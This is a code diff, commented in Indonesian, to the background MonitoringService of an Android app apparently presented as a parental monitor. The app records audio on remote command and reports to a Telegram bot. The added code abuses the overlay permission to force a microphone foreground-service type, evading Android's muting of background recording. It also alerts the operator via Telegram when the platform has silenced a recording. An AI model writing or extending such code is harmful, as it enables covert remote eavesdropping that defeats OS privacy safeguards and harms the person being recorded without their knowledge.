@@ -11449,6 +11449,12 @@ class MonitoringService : Service() {
         if ((types and ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA) != 0 && !hasCameraFgsType()) {
             wakeForegroundForCameraType()
         }
+        // Mikrofon setara kamera (issue #1454): dulu hanya
+        // kamera yang dibangkitkan tipenya; mic yang
+        // tertinggal membuat platform membisukan rekaman.
+        if ((types and ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE) != 0 && (appliedFgsTypes and ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE) == 0) {
+            wakeForegroundForCameraType()
+        }
     }
 
     private fun hasCameraFgsType(): Boolean {
@@ -11457,7 +11463,7 @@ class MonitoringService : Service() {
 
     private fun wakeForegroundForCameraType() {
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.UPSIDE_DOWN_CAKE) return
-        if (!isRunning || !hasCameraPermission()) return
+        if (!isRunning || (!hasCameraPermission() && !hasMicPermission())) return
         if (!com.redeye.parentalmonitor.utils.AutoStart.canDrawOverlays(this)) return
         val now = SystemClock.elapsedRealtime()
         val last = cameraWakeAt
@@ -12158,6 +12164,11 @@ class MonitoringService : Service() {
             recorder.prepare()
             recorderActive.set(true)
             recorder.start()
+            // Amplitudo maksimum selama rekam (issue #1454):
+            // nol mutlak di seluruh rekaman = tanda mikrofon
+            // dibisukan platform, bukan ruangan hening (lantai
+            // derau mic sungguhan tak pernah nol persis).
+            var amplitudoMax = 0
             var interruptedByCall = false
             var elapsedRecMs = 0L
             val targetRecMs = seconds * 1000L
@@ -12169,6 +12180,8 @@ class MonitoringService : Service() {
                 val sliceMs = minOf(500L, targetRecMs - elapsedRecMs)
                 kotlinx.coroutines.delay(sliceMs)
                 elapsedRecMs += sliceMs
+                val amp = try { recorder.maxAmplitude } catch (_: Exception) { 0 }
+                if (amp > amplitudoMax) amplitudoMax = amp
             }
             if (interruptedByCall) {
                 try { recorder.stop() } catch (_: Exception) { }
@@ -12213,6 +12226,12 @@ class MonitoringService : Service() {
                 return
             }
             recorderActive.set(false)
+            if (amplitudoMax == 0) {
+                try {
+                    sendToTelegram("⚠️ Rekaman selesai tetapi TANPA sinyal suara sama sekali (amplitudo nol) — kemungkinan mikrofon dibisukan sistem karena tipe FGS mikrofon belum terpasang (lazim sesudah reboot). Buka aplikasi sekali, lalu coba /record lagi.")
+                } catch (_: Exception) {
+                }
+            }
             if (try { preferencesManager.monitoringPaused } catch (_: Exception) { false }) {
                 keepForRetry = true
                 audioOutcome = MediaSendOutcome.KEPT
